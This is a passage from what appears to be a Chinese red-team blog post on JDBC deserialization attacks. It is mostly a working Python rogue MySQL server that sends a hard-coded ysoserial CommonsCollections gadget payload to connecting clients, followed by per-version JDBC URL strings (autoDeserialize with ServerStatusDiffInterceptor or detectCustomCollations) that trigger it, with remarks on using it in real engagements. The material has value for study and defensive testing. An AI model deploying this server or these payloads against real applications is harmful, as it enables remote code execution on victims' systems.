    print(&quot;<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending the package <span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>&quot;.format(data))
    conn.send(binascii.a2b_hex(data))

<span class="token key atrule">def get_payload_content()</span><span class="token punctuation">:</span>
    //file文件的内容使用ysoserial生成的 使用规则  java <span class="token punctuation">-</span>jar ysoserial <span class="token punctuation">[</span>common7那个<span class="token punctuation">]</span>  &quot;calc&quot; <span class="token punctuation">&gt;</span> a 
    file= r'a'
    <span class="token key atrule">if os.path.isfile(file)</span><span class="token punctuation">:</span>
        with open(file<span class="token punctuation">,</span> 'rb') as f<span class="token punctuation">:</span>
            payload_content = str(binascii.b2a_hex(f.read())<span class="token punctuation">,</span>encoding='utf<span class="token punctuation">-</span>8')
        print(&quot;open successs&quot;)

    <span class="token key atrule">else</span><span class="token punctuation">:</span>
        print(&quot;open false&quot;)
        <span class="token comment">#calc</span>
        payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'
    return payload_content

<span class="token comment"># 主要逻辑</span>
<span class="token key atrule">def run()</span><span class="token punctuation">:</span>

    <span class="token key atrule">while 1</span><span class="token punctuation">:</span>
        conn<span class="token punctuation">,</span> addr = sk.accept()
        print(&quot;Connection come from <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span>&quot;.format(addr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>addr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>))

        <span class="token comment"># 1.先发送第一个 问候报文</span>
        send_data(conn<span class="token punctuation">,</span>greeting_data)

        <span class="token key atrule">while True</span><span class="token punctuation">:</span>
            <span class="token comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span>
            receive_data(conn)
            send_data(conn<span class="token punctuation">,</span>response_ok_data)

            <span class="token comment">#其他过程</span>
            data=receive_data(conn)
            <span class="token comment">#查询一些配置信息,其中会发送自己的 版本号</span>
            <span class="token key atrule">if &quot;session.auto_increment_increment&quot; in data</span><span class="token punctuation">:</span>
                _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'
                send_data(conn<span class="token punctuation">,</span>_payload)
                data=receive_data(conn)
            <span class="token key atrule">elif &quot;show warnings&quot; in data</span><span class="token punctuation">:</span>
                _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'
                send_data(conn<span class="token punctuation">,</span> _payload)
                data = receive_data(conn)
            <span class="token key atrule">if &quot;set names&quot; in data</span><span class="token punctuation">:</span>
                send_data(conn<span class="token punctuation">,</span> response_ok_data)
                data = receive_data(conn)
            <span class="token key atrule">if &quot;set character_set_results&quot; in data</span><span class="token punctuation">:</span>
                send_data(conn<span class="token punctuation">,</span> response_ok_data)
                data = receive_data(conn)
            <span class="token key atrule">if &quot;show session status&quot; in data</span><span class="token punctuation">:</span>
                mysql_data = '0100000102'
                mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'
                mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'
                <span class="token comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span>
                //获取payload
                payload_content=get_payload_content()
                //计算payload长度
                payload_length = str(hex(len(payload_content)//2)).replace('0x'<span class="token punctuation">,</span> '').zfill(4)
                payload_length_hex = payload_length<span class="token punctuation">[</span>2<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> + payload_length<span class="token punctuation">[</span>0<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>
                //计算数据包长度
                data_len = str(hex(len(payload_content)//2 + 4)).replace('0x'<span class="token punctuation">,</span> '').zfill(6)
                data_len_hex = data_len<span class="token punctuation">[</span>4<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> + data_len<span class="token punctuation">[</span>2<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> + data_len<span class="token punctuation">[</span>0<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>
                mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex
                mysql_data += str(payload_content)
                mysql_data += '07000005fe000022000100'
                send_data(conn<span class="token punctuation">,</span> mysql_data)
                data = receive_data(conn)
            <span class="token key atrule">if &quot;show warnings&quot; in data</span><span class="token punctuation">:</span>
                payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'
                send_data(conn<span class="token punctuation">,</span> payload)
            break


<span class="token key atrule">if __name__ == '__main__'</span><span class="token punctuation">:</span>
    HOST ='0.0.0.0'
    PORT = 3307

    sk = socket.socket(socket.AF_INET<span class="token punctuation">,</span> socket.SOCK_STREAM)
    <span class="token comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span>
    sk.setsockopt(socket.SOL_SOCKET<span class="token punctuation">,</span> socket.SO_REUSEADDR<span class="token punctuation">,</span> 1)
    sk.bind((HOST<span class="token punctuation">,</span> PORT))
    sk.listen(1)
    print(&quot;start fake mysql server listening on <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span>&quot;.format(HOST<span class="token punctuation">,</span>PORT))

    run()
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br></div></div><h2 id="exp"><a href="#exp" class="header-anchor">#</a> Exp</h2> <p>测试的时候把yso这个包也当做依赖加进来才能出发CC链。所以实战中最好全部跑一边，只要确定目标的版本没问题的话。
<img src="https://cdn.nlark.com/yuque/0/2021/png/370919/1616239498908-5fd43fab-7daf-419e-b14f-dca665ad3b97.png#align=left&amp;display=inline&amp;height=932&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1864&amp;originWidth=3052&amp;size=570652&amp;status=done&amp;style=none&amp;width=1526" alt="image.png"> <img src="https://cdn.nlark.com/yuque/0/2021/png/370919/1616239443837-399e98b0-b5d5-4b11-98f7-3f8525c0a433.png#align=left&amp;display=inline&amp;height=614&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1228&amp;originWidth=2238&amp;size=908491&amp;status=done&amp;style=none&amp;width=1119" alt="image.png"> <img src="https://cdn.nlark.com/yuque/0/2021/png/370919/1616239370864-619822b8-0e08-46c8-a87c-e59df0f9e593.png#align=left&amp;display=inline&amp;height=494&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=988&amp;originWidth=2646&amp;size=458349&amp;status=done&amp;style=none&amp;width=1323" alt="image.png"></p> <div class="language-yaml line-numbers-mode"><pre class="language-yaml"><code>ServerStatusDiffInterceptor触发
<span class="token key atrule">8.x</span><span class="token punctuation">:</span> jdbc<span class="token punctuation">:</span>mysql<span class="token punctuation">:</span>//127.0.0.1<span class="token punctuation">:</span>3306/test<span class="token punctuation">?</span>autoDeserialize=true<span class="token important">&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</span>

<span class="token key atrule">6.x(属性名不同)</span><span class="token punctuation">:</span> jdbc<span class="token punctuation">:</span>mysql<span class="token punctuation">:</span>//127.0.0.1<span class="token punctuation">:</span>3306/test<span class="token punctuation">?</span>autoDeserialize=true<span class="token important">&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</span>

<span class="token key atrule">5.1.11及以上的5.x版本（包名没有了cj）</span><span class="token punctuation">:</span> jdbc<span class="token punctuation">:</span>mysql<span class="token punctuation">:</span>//127.0.0.1<span class="token punctuation">:</span>3306/test<span class="token punctuation">?</span>autoDeserialize=true<span class="token important">&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</span>

5.1.10及以下的5.1.X版本： 同上，但是需要连接后执行查询。

<span class="token key atrule">5.0.x</span><span class="token punctuation">:</span> 还没有ServerStatusDiffInterceptor这个东西┓( ´∀` )┏

detectCustomCollations触发：
<span class="token key atrule">5.1.41及以上</span><span class="token punctuation">:</span> 不可用

<span class="token key atrule">5.1.29-5.1.40</span><span class="token punctuation">:</span> jdbc<span class="token punctuation">:</span>mysql<span class="token punctuation">:</span>//127.0.0.1<span class="token punctuation">:</span>3306/test<span class="token punctuation">?</span>detectCustomCollations=true<span class="token important">&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc</span>

5.1.28<span class="token punctuation">-</span>5.1.19： jdbc<span class="token punctuation">:</span>mysql<span class="token punctuation">:</span>//127.0.0.1<span class="token punctuation">:</span>3306/test<span class="token punctuation">?</span>autoDeserialize=true<span class="token important">&amp;user=yso_JRE8u20_calc</span>

5.1.18以下的5.1.x版本： 不可用

5.0.x版本不可用
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><h2 id="补充"><a href="#补充" class="header-anchor">#</a> 补充</h2> <p>可以配合Tomcat和Spring进行回显利用</p> <h2 id="资料（原文）"><a href="#资料（原文）" class="header-anchor">#</a> 资料（原文）</h2> <p><a href="https://xz.aliyun.com/t/9250" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/9250<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> <a href="https://xz.aliyun.com/t/8159#toc-2" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/8159#toc-2<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> <a href="https://github.com/fnmsd/MySQL_Fake_Server" target="_blank" rel="noopener noreferrer">https://github.com/fnmsd/MySQL_Fake_Server<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p></div></div> <div class="page-slot page-slot-bottom"><!-- 横向自适应 -->
      <ins class="adsbygoogle"
          style="display:block"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="6620245489"
          data-ad-format="auto"
          data-full-width-responsive="true"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div> <div class="page-edit"><div class="edit-link"><a href="https://github.com/XTeam-Wing/edit/master/docs/01.Blog/02.渗透测试/03.JAVA安全/01.JDBC反序列化入门学习.md" target="_blank" rel="noopener noreferrer">Edit this page</a> <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></div> <!----> <!----></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/5e9891/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">Github项目集成qodana进行静态代码扫描</div></a> <a href="/pages/f5c866/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">快速入门开发IOS插件</div></a></div> <div class="page-nav"><p class="inner"><span class="prev">
        ←
        <a href="/pages/5e9891/" class="prev">Github项目集成qodana进行静态代码扫描</a></span> <span class="next"><a href="/pages/f5c866/">快速入门开发IOS插件</a>→
      </span></p></div></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">最近更新</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/00c27d/"><div>调用阿里云OpenAPI创建抢占式实例</div></a> <span>06-29</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/5e9891/"><div>Github项目集成qodana进行静态代码扫描</div></a> <span>06-26</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/66f295/"><div>Web敏感信息识别工具</div></a> <span>06-23</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">更多文章&gt;</a></dt></dl></div></div></main></div> <div class="footer"><div class="icons"><a href="mailto:redteam@aliyun.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/XTeam-Wing" title="GitHub" target="_blank" class="iconfont icon-github"></a><a href="https://twitter.com/XTeamWing" title="推特" target="_blank" class="iconfont icon-erji"></a></div> <div class="busuanzi"><p>
      Wing已运营本站:  
    </p> <span id="busuanzi_container_site_pv" style="display:none">
    本站总访问量
    <span id="busuanzi_value_site_pv"></span>次
    <span class="post-meta-divider">|</span></span> <span id="busuanzi_container_site_uv" style="display:none">
    本站访客数
    <span id="busuanzi_value_site_uv"></span>人
  </span></div> <a href="https://github.com/XTeam-Wing/" target="_blank" title="本站主题">RedTeaming</a> 
    | Copyright © 2020-2023
    <span>Wing | <a href="https://weibo.com/u/6077156187?topnav=1&wvr=6&topsug=1" target="_blank">MIT License</a></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">跟随系统</li><li class="iconfont icon-rijianmoshi">浅色模式</li><li class="iconfont icon-yejianmoshi">深色模式</li><li class="iconfont icon-yuedu">阅读模式</li></ul></div></div> <!----> <!----> <div class="custom-html-window custom-html-window-rb" style="display:;"><div class="custom-wrapper"><i class="close-but">×</i> <div><!-- 固定160*160px -->
      <ins class="adsbygoogle"
          style="display:inline-block;max-width:160px;max-height:160px"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="8377369658"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script>
      </div></div></div></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.be83bd91.js" defer></script><script src="/assets/js/2.b71e909d.js" defer></script><script src="/assets/js/3.aae92b90.js" defer></script><script src="/assets/js/15.c893a769.js" defer></script>
  </body>
</html>